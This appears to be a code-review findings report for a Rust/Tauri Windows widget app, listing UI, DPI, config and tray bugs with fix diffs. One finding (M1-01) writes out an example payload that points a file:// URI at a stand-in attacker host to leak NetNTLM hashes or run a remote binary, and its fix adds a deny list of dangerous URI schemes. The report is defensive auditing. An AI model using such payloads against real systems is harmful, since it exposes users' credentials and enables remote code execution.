# Review Findings: Module M1 (Core Windows Native & Backend Host)

## Summary of Findings

| ID | Severity | Category | Lens | Title |
|---|---|---|---|---|
| M1-01 | CRITICAL | security | F1b | Arbitrary UNC Protocol and Remote NetNTLM Credential Leak Bypass in Custom Action Validation |
| M1-02 | MAJOR | bug | F1b | Race Condition in `hide_window` Causes Shell Subclass to Veto Programmatic Hide |
| M1-03 | MAJOR | bug | F1b | Dragged Non-Starter Widgets Silently Drop Position Persistence in Config |
| M1-04 | MAJOR | bug | F1 | WindowManager Stale Scale Factor Inflates Logical Bounds Across Monitor DPI Boundaries |
| M1-05 | MAJOR | bug | F1b | WindowManager Lock State Disconnected from Win32 Subclass Allowing Drag When Locked |
| M1-06 | MINOR | contract | F1 | System Tray Menu CheckMenuItems Never Update Checked State on Toggle |
| M1-07 | MINOR | bug | F1 | `open_widget_window` Disables `no_activate` Allowing Desktop Widgets to Steal Focus |
| M1-08 | MINOR | contract | F1 | Predefined Action Target Resolution Rejects "volume" Identifier |
| M1-09 | ENHANCEMENT | performance | F1 | Oversized Screen Invalidation in `hide_skeleton_preview` and `WM_EXITSIZEMOVE` |

---

### [CRITICAL] [OPEN] M1-01 Arbitrary UNC Protocol and Remote NetNTLM Credential Leak Bypass in Custom Action Validation
- **Status**: OPEN
- **Where**: `src-tauri/src/actions/mod.rs:43-58`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: security
- **Scenario**: An attacker or untrusted payload triggers `execute_quick_action("custom", Some("file://attacker.com/share/poc.exe"))` or `file:\\\\attacker.com\\share`.
- **Why**: `validate_custom_target` only validates that `target` does not start with `\\` or `//`. Passing a `file://` scheme or embedding backslashes bypasses this check. `is_uri_target` classifies `file://` as a URI, and `ShellExecuteW` resolves it to a remote SMB/WebDAV share, leaking the logged-in user's NetNTLM authentication hashes and potentially executing arbitrary remote binaries.
- **Fix**:
```diff
--- a/src-tauri/src/actions/mod.rs
+++ b/src-tauri/src/actions/mod.rs
@@ -49,8 +49,14 @@ fn validate_custom_target(target: &str) -> Result<(), String> {
     if target.len() > 2048 {
         return Err("Target exceeds maximum allowed length (2048 chars)".to_string());
     }
-    // Prohibit remote SMB / UNC network paths to prevent NetNTLM credential leaks
-    if target.starts_with(r"\\") || target.starts_with("//") {
+    // Prohibit remote SMB / UNC network paths and dangerous schemes
+    let lower = target.to_lowercase();
+    if lower.starts_with(r"\\")
+        || lower.starts_with("//")
+        || lower.starts_with("file:")
+        || lower.starts_with("ms-msdt:")
+        || lower.starts_with("search-ms:")
+    {
         return Err("UNC network paths are prohibited".to_string());
     }
     // Prohibit shell command chaining, pipe, and redirection attacks
```

---

### [MAJOR] [OPEN] M1-02 Race Condition in `hide_window` Causes Shell Subclass to Veto Programmatic Hide
- **Status**: OPEN
- **Where**: `src-tauri/src/window/win32.rs:119-130`, `src-tauri/src/window/win32.rs:456-462`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: Application switches layout mode or hides the main window via `hide_window(&main)` from an async runtime task.
- **Why**: `hide_window` sets `set_window_allow_hide(hwnd, true)`, triggers `window.hide()`, and immediately sets `set_window_allow_hide(hwnd, false)` on the caller thread. Because `window.hide()` dispatches asynchronously across threads to the Win32 UI message queue, `set_window_allow_hide(false)` executes before `WM_SHOWWINDOW` is dispatched. When `widget_subclass_proc` receives `WM_SHOWWINDOW`, `is_window_allow_hide` is already `false`, vetoing the hide with `return LRESULT(0)` and leaving the window permanently visible.
- **Fix**:
```diff
--- a/src-tauri/src/window/win32.rs
+++ b/src-tauri/src/window/win32.rs
@@ -123,10 +123,6 @@ pub fn hide_window<R: tauri::Runtime>(window: &tauri::WebviewWindow<R>) -> Resul
     if let Ok(hwnd) = window.hwnd() {
         set_window_allow_hide(hwnd.0 as isize, true);
     }
-    let res = window.hide();
-    #[cfg(windows)]
-    if let Ok(hwnd) = window.hwnd() {
-        set_window_allow_hide(hwnd.0 as isize, false);
-    }
-    res
+    window.hide()
 }
@@ -457,7 +453,11 @@ unsafe extern "system" fn widget_subclass_proc(
         WM_SHOWWINDOW => {
-            if wparam.0 == 0 && !is_window_allow_hide(hwnd.0 as isize) {
-                // Veto the hide request from the Windows Shell on Win+D / Show Desktop
-                return LRESULT(0);
+            if wparam.0 == 0 {
+                if is_window_allow_hide(hwnd.0 as isize) {
+                    set_window_allow_hide(hwnd.0 as isize, false);
+                } else {
+                    // Veto the hide request from the Windows Shell on Win+D / Show Desktop
+                    return LRESULT(0);
+                }
             }
             DefSubclassProc(hwnd, umsg, wparam, lparam)
         }
```

---

### [MAJOR] [OPEN] M1-03 Dragged Non-Starter Widgets Silently Drop Position Persistence in Config
- **Status**: OPEN
- **Where**: `src-tauri/src/window/manager.rs:177-185`, `src-tauri/src/lib.rs:133-143`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: User toggles on any non-starter widget (e.g. `speedtest`, `launcher`, `calendar`, `battery`, `clock`, `bluetooth`, `quick_settings`) and drags it to a new desktop position.
- **Why**: `AppConfig::default()` only creates Map entries for `resources`, `spotify`, and `weather`. `handle_window_moved` and `save_widget_position` look up `config.widgets.get_mut(&widget_id)`. If the key does not already exist, `get_mut` returns `None`, silently discarding the coordinate update without inserting a `WidgetPlacement`, so the moved position is never saved to disk.
- **Fix**:
```diff
--- a/src-tauri/src/window/manager.rs
+++ b/src-tauri/src/window/manager.rs
@@ -178,13 +178,16 @@ impl WindowManager {
                 tauri::async_runtime::spawn(async move {
                     let mut config = cm.get_config().await;
-                    if let Some(placement) = config.widgets.get_mut(&widget_id) {
-                        placement.logical_x = logical_x;
-                        placement.logical_y = logical_y;
-                        placement.logical_width = logical_width;
-                        placement.logical_height = logical_height;
-                        placement.scale_factor = scale;
-                    }
+                    let placement = config.widgets.entry(widget_id.clone()).or_insert_with(|| crate::config::WidgetPlacement {
+                        id: widget_id.clone(),
+                        visible: true,
+                        logical_x,
+                        logical_y,
+                        logical_width,
+                        logical_height,
+                        scale_factor: scale,
+                        monitor_id: None,
+                    });
+                    placement.logical_x = logical_x;
+                    placement.logical_y = logical_y;
+                    placement.logical_width = logical_width;
+                    placement.logical_height = logical_height;
+                    placement.scale_factor = scale;
                     if let Err(e) = cm.save_debounced(config).await {
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -133,12 +133,16 @@ pub mod integration {
         if let Some(cm) = app.try_state::<ConfigManager>() {
             let mut config = cm.get_config().await;
-            let (w, h) = if let Some(placement) = config.widgets.get_mut(&widget_id) {
-                placement.logical_x = logical_x;
-                placement.logical_y = logical_y;
-                (placement.logical_width, placement.logical_height)
-            } else {
-                (320.0, 240.0)
-            };
+            let placement = config.widgets.entry(widget_id.clone()).or_insert_with(|| crate::config::WidgetPlacement {
+                id: widget_id.clone(),
+                visible: true,
+                logical_x,
+                logical_y,
+                logical_width: 320.0,
+                logical_height: 240.0,
+                scale_factor: 1.0,
+                monitor_id: None,
+            });
+            placement.logical_x = logical_x;
+            placement.logical_y = logical_y;
+            let (w, h) = (placement.logical_width, placement.logical_height);
```

---

### [MAJOR] [OPEN] M1-04 WindowManager Stale Scale Factor Inflates Logical Bounds Across Monitor DPI Boundaries
- **Status**: OPEN
- **Where**: `src-tauri/src/window/manager.rs:165-171`, `src-tauri/src/window/win32.rs:483-540`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: User drags a widget from a standard DPI display (100% scale factor 1.0) onto a high-DPI display (200% scale factor 2.0).
- **Why**: `WidgetWindowInfo.scale_factor` is cached once at initial window setup and never updated when crossing monitors. In `handle_window_moved`, the new physical pixel rect (e.g. 640x480) is divided by the stale scale factor (1.0 instead of 2.0), storing inflated logical width and height (640x480) into config and causing the window size to double on restart.
- **Fix**:
```diff
--- a/src-tauri/src/window/manager.rs
+++ b/src-tauri/src/window/manager.rs
@@ -166,7 +166,13 @@ impl WindowManager {
     pub fn handle_window_moved(&self, hwnd: isize, rect: Rect) {
         if let Some(info) = self.find_widget_by_hwnd(hwnd) {
-            let scale = if info.scale_factor > 0.0 { info.scale_factor } else { 1.0 };
+            #[cfg(windows)]
+            let current_scale = unsafe {
+                let dpi = windows::Win32::UI::HiDpi::GetDpiForWindow(windows::Win32::Foundation::HWND(hwnd as *mut _));
+                if dpi > 0 { dpi as f64 / 96.0 } else { info.scale_factor }
+            };
+            #[cfg(not(windows))]
+            let current_scale = info.scale_factor;
+            let scale = if current_scale > 0.0 { current_scale } else { 1.0 };
             let logical_x = (rect.left as f64) / scale;
             let logical_y = (rect.top as f64) / scale;
```

---

### [MAJOR] [OPEN] M1-05 WindowManager Lock State Disconnected from Win32 Subclass Allowing Drag When Locked
- **Status**: OPEN
- **Where**: `src-tauri/src/window/manager.rs:88-90`, `src-tauri/src/window/win32.rs:472-540`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: User sets "Lock Positions" to true via the tray menu or Settings. User or accidental mouse drag moves a widget window.
- **Why**: `WindowManager::set_locked` updates an internal atomic boolean, but `widget_subclass_proc` in `win32.rs` never checks this lock state. During `WM_MOVING` and `WM_EXITSIZEMOVE`, magnetic snapping, `SetWindowPos`, and config persistence continue to execute normally, bypassing the lock.
- **Fix**:
```diff
--- a/src-tauri/src/window/win32.rs
+++ b/src-tauri/src/window/win32.rs
@@ -64,6 +64,14 @@ static SNAP_TO_GRID: AtomicBool = AtomicBool::new(true);
+static POSITIONS_LOCKED: AtomicBool = AtomicBool::new(false);
+pub fn set_positions_locked(locked: bool) {
+    POSITIONS_LOCKED.store(locked, Ordering::SeqCst);
+}
+pub fn is_positions_locked() -> bool {
+    POSITIONS_LOCKED.load(Ordering::SeqCst)
+}
+
@@ -473,6 +481,9 @@ unsafe extern "system" fn widget_subclass_proc(
         WM_MOVING => {
+            if is_positions_locked() {
+                return LRESULT(0);
+            }
             let p_rect = lparam.0 as *mut RECT;
--- a/src-tauri/src/window/manager.rs
+++ b/src-tauri/src/window/manager.rs
@@ -89,6 +89,7 @@ impl WindowManager {
     pub fn set_locked(&self, locked: bool) {
         self.locked.store(locked, Ordering::SeqCst);
+        crate::window::win32::set_positions_locked(locked);
     }
```

---

### [MINOR] [OPEN] M1-06 System Tray Menu CheckMenuItems Never Update Checked State on Toggle
- **Status**: OPEN
- **Where**: `src-tauri/src/tray/mod.rs:250-310`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: contract
- **Scenario**: User opens the system tray context menu and toggles "Lock Positions" or any of the 10 widget checkboxes.
- **Why**: Unlike `layout_independent` and `layout_docked` (which invoke `.set_checked(bool)` on lines 318-319), `toggle_lock` and all 10 `toggle_<widget>` handlers mutate config but never update the tray menu checkmark via `.set_checked()`. The checkmarks in the tray menu remain frozen in their startup state.
- **Fix**:
```diff
--- a/src-tauri/src/tray/mod.rs
+++ b/src-tauri/src/tray/mod.rs
@@ -253,6 +253,7 @@ pub fn setup_tray<R: Runtime>(app: &AppHandle<R>) -> Result<TrayIcon<R>, Box<dyn
                     tauri::async_runtime::spawn(async move {
                         if let Ok(mut config) = load_config(handle.clone()).await {
                             config.lock_positions = !config.lock_positions;
+                            let _ = toggle_lock.set_checked(config.lock_positions);
                             let _ = save_config_immediate(handle, config).await;
                         }
                     });
```

---

### [MINOR] [OPEN] M1-07 `open_widget_window` Disables `no_activate` Allowing Desktop Widgets to Steal Focus
- **Status**: OPEN
- **Where**: `src-tauri/src/lib.rs:107`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: bug
- **Scenario**: A user clicks on a floating widget while running a full-screen game or typing in an active foreground application.
- **Why**: `open_widget_window` passes `no_activate: false` to `WindowSetupOptions` (whereas docked mode and `WindowSetupOptions::default()` pass `true`). Consequently, `apply_tool_window_styles` omits `WS_EX_NOACTIVATE`, causing independent desktop widgets to steal window focus.
- **Fix**:
```diff
--- a/src-tauri/src/lib.rs
+++ b/src-tauri/src/lib.rs
@@ -106,5 +106,5 @@ pub mod integration {
                 WindowSetupOptions {
                     id: widget_id.clone(),
                     is_widget: true,
-                    no_activate: false,
+                    no_activate: true,
                     dark_mode: config.theme != "light",
```

---

### [MINOR] [OPEN] M1-08 Predefined Action Target Resolution Rejects "volume" Identifier
- **Status**: OPEN
- **Where**: `src-tauri/src/actions/mod.rs:15-24`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: contract
- **Scenario**: User triggers quick action `"volume"` (as configured in `model.rs:373` and default tiles).
- **Why**: `resolve_action_target` only matches `"sound"` and fails on `"volume"`, returning `Err("Unknown action identifier: 'volume'")` instead of opening Windows audio settings.
- **Fix**:
```diff
--- a/src-tauri/src/actions/mod.rs
+++ b/src-tauri/src/actions/mod.rs
@@ -15,5 +15,5 @@ pub fn resolve_action_target(
     match action_id {
-        "sound" => Ok(ResolvedAction::Uri("ms-settings:sound".to_string())),
+        "sound" | "volume" => Ok(ResolvedAction::Uri("ms-settings:sound".to_string())),
         "bluetooth" => Ok(ResolvedAction::Uri("ms-settings:bluetooth".to_string())),
```

---

### [ENHANCEMENT] [OPEN] M1-09 Oversized Screen Invalidation in `hide_skeleton_preview` and `WM_EXITSIZEMOVE`
- **Status**: OPEN
- **Where**: `src-tauri/src/window/win32.rs:326`, `src-tauri/src/window/win32.rs:534`
- **Source**: `r-review` (Tier 3) (2026-10-27)
- **Confidence**: HIGH
- **Category**: performance
- **Scenario**: Widget drag concludes and preview is hidden.
- **Why**: `invalidate_screen_rect(0, 0, 8000, 8000)` calls `RedrawWindow` across the entire multi-monitor desktop workspace and all child windows with `RDW_ALLCHILDREN`, causing unnecessary desktop repaints and transient flicker rather than dirtying only the skeleton window's bounding rect.
- **Fix**:
```diff
--- a/src-tauri/src/window/win32.rs
+++ b/src-tauri/src/window/win32.rs
@@ -531,5 +531,7 @@ unsafe extern "system" fn widget_subclass_proc(
                 let skel = get_skeleton_hwnd();
                 if skel != 0 {
                     let skel_hwnd = HWND(skel as *mut core::ffi::c_void);
+                    let mut skel_rect = RECT::default();
+                    let _ = GetWindowRect(skel_hwnd, &mut skel_rect);
                     use windows::Win32::UI::WindowsAndMessaging::SW_HIDE;
                     let _ = ShowWindow(skel_hwnd, SW_HIDE);
-                    invalidate_screen_rect(0, 0, 8000, 8000);
+                    invalidate_screen_rect(skel_rect.left, skel_rect.top, skel_rect.right - skel_rect.left, skel_rect.bottom - skel_rect.top);
                 }
```
